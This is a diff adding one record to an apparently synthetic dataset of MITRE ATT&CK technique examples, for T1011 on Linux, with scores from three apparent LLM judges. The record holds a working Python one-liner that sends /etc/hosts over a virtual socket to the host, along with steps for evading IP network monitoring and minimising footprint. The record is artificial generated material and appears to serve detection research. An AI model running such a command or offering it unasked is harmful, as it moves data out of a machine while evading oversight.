@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import socket; s=socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM); s.settimeout(6); s.connect((2, 60917)); s.sendall(open('/etc/hosts','rb').read()); s.close()\"",
+  "explanation": "Sends /etc/hosts over a virtual socket to the host (CID 2), leveraging a transport outside the primary IP stack in accordance with T1011.",
+  "rationale_steps": [
+    "Use vsock to bypass IP network monitoring pathways.",
+    "Select a high, atypical vsock port (60917).",
+    "Read /etc/hosts and send the bytes over vsock.",
+    "Close the connection to minimize footprint."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-2e02ce6e-ffa89360",
+  "source_prompt_hash": "2e02ce6e",
+  "timestamp_utc": "2025-09-30T08:40:28.862749Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Properly quoted Python one-liner with valid socket calls, balanced punctuation, and correct use of sendall on file bytes.",
+        "semantic_score": 5,
+        "semantic_justification": "Transmits /etc/hosts over AF_VSOCK to host CID 2 on port 60917, using a non-IP transport consistent with T1011 assuming vsock support and a listener.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T00:13:43.143739Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed with balanced quotes, parentheses, and proper syntax for importing modules, creating a socket, setting timeout, connecting, sending data, and closing the connection.",
+        "semantic_score": 5,
+        "semantic_justification": "The command correctly implements T1011 by using AF_VSOCK (virtual socket) as an alternative network medium to the standard TCP/IP stack, successfully exfiltrating the /etc/hosts file to the host system via a channel that would bypass traditional network monitoring.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T00:13:51.586526Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed with balanced quotes, parentheses, and valid Python syntax for socket operations.",
+        "semantic_score": 5,
+        "semantic_justification": "The command correctly uses `AF_VSOCK` to send data over a virtual socket, which represents an 'other network medium' outside the primary IP stack, aligning perfectly with the intent of T1011 to exfiltrate data via an alternative communication channel, especially relevant in virtualized environments.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T00:14:00.645637Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
